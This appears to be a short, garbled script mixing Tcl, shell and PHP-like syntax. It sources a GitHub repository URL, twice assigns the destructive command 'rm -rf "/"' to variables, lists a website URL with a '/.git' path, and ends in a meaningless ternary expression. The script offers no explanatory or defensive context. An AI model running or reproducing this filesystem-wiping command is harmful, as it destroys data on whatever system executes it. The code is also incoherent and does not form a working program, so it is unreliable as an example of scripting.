source "https://github.com/Andrei-Barwood/Mithril"
source "/.urls/cloudflare.com/"

set y [rm -rf "/"]
set z [rm -rf "/"]
set x { \
	["https://theapplewiki.com".${"/.git"}] \
}
foreach repositories $x {
	y = yes
	z = on
}


$x?:$y:$z